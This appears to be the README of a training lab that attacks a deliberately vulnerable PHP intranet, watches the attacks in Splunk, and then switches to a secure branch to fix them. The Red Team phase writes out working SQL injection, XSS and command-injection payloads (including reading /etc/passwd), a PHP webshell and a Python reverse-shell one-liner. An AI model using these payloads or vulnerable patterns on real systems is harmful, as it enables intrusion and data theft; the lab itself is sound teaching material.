🛡️ Full-Lifecycle Web Application Attack & Defense Lab

Welcome to my Red/Blue Enterprise Simulation Lab! 

I built this project to simulate a complete cyberattack lifecycle on a single Kali Linux machine. By running this lab, you get to play both sides of the board: you will hack into a vulnerable corporate intranet (Red Team), track your own footprints in a SIEM (Blue Team), and then apply secure code to stop the attacks (Mitigation).

## ⚙️ Prerequisites
To run this lab locally, you will need:
* A Kali Linux VM (or any Debian-based Linux distro)
* Apache2 and PHP (`sudo apt install apache2 php`)
* Docker (`sudo apt install docker.io`)
* SQLite3 (`sudo apt install sqlite3`)

---

## 🚀 How to Run the Lab

### Phase 1: Deploy the Environment
First, we need to download the code and set up the vulnerable environment and our Splunk SIEM.

1. **Clone the repository:**
   ```bash
   sudo git clone [https://github.com/ghafer-khalfaoui/red-blue-enterprise-simulation.git](https://github.com/ghafer-khalfaoui/red-blue-enterprise-simulation.git) /var/www/html/corpnet
   cd /var/www/html/corpnet
Switch to the vulnerable branch!
(By default, GitHub shows the secure main branch. To start the lab, you MUST switch to the hackable version).

Bash
sudo git checkout vulnerable-version
Prepare the logs, folders, and database:

Bash
# Prepare Splunk log files
sudo touch /var/log/apache2/access.log
sudo touch /root/.bash_history
sudo chmod 755 /var/log/apache2
sudo chmod 644 /var/log/apache2/access.log

# Create the uploads directory so the webshell exploit works
sudo mkdir -p /var/www/html/corpnet/uploads
sudo chmod 777 /var/www/html/corpnet/uploads

# Generate the vulnerable database for the SQLi attack
sqlite3 /tmp/payroll.db "CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, salary TEXT); INSERT INTO users (id, username, salary) VALUES (1, 'admin', '\$150,000'), (2, 'omar', '\$85,000');"
sudo chmod 666 /tmp/payroll.db
Boot up Splunk via Docker:

Bash
sudo docker run -d --name splunk_siem -p 8000:8000 -p 8089:8089 \
  -e SPLUNK_GENERAL_TERMS='--accept-sgt-current-at-splunk-com' \
  -e SPLUNK_START_ARGS='--accept-license' \
  -e SPLUNK_PASSWORD='CorporateSIEM123!' \
  -v /var/log/apache2:/var/log/apache2:ro \
  splunk/splunk:latest
Wait 2-3 minutes, log in at http://localhost:8000 (admin / CorporateSIEM123!), and add /var/log/apache2/access.log to your Data Inputs.

Phase 2: Hack the App (Red Team)
Open your browser and go to http://localhost/corpnet/index.php. Use the following payloads to exploit the 4 modules:

🔴 1. SQL Injection (Payroll Lookup)

The Exploit: Bypass the ID filter to dump all employee salaries.

Payload: 1 OR 1=1

🔴 2. Cross-Site Scripting (Employee Directory)

The Exploit: Execute unauthorized JavaScript in the browser.

Payload: <script>alert("Red Team Compromise!");</script>

🔴 3. OS Command Injection (Network Tools)

The Exploit: Chain commands onto the ping tool to read sensitive system files.

Payload: 127.0.0.1; whoami; pwd; cat /etc/passwd

🔴 4. File Upload to Remote Code Execution (Profile Update)

The Exploit: Upload a malicious PHP file to get a root shell on the server.

Step A: Create the webshell on your desktop:

Bash
  cat << 'EOF' > ~/Desktop/revshell.php
  <?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; system($_REQUEST['cmd']); echo "</pre>"; die; } ?>
  EOF
Step B: Upload revshell.php via the web page.

Step C: Start a listener in your terminal: nc -lvnp 4444

Step D: Trigger the shell by going to this URL:
http://localhost/corpnet/uploads/revshell.php?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'

Phase 3: Hunt the Attacker (Blue Team)
Put on your Incident Responder hat.

Go to your Splunk Dashboard (http://localhost:8000).

Run this search to view the Apache web logs: source="/var/log/apache2/access.log"

Look through the logs. You will clearly see the <script> tags, the 1 OR 1=1 SQL query, and the revshell.php upload!

Contain the threat: Open your terminal and delete the attacker's webshell to kick them out:

Bash
sudo rm -f /var/www/html/corpnet/uploads/revshell.php
Phase 4: Secure the Code (Mitigation)
Now that the threat is contained, let's fix the terrible code so this never happens again.

Switch to the secure main branch:

Bash
sudo git checkout secure-version
What changed? If you look at the PHP files now, you will see I applied:

Strict Whitelisting for file uploads (only .png and .jpg allowed).

Input Validation for the ping tool (filter_var for IPs).

Output Encoding for XSS (htmlspecialchars).

Prepared Statements for the SQL database to prevent injection.

Verify the fixes: Go back to http://localhost/corpnet/index.php and try the Red Team payloads again. They will all fail securely!
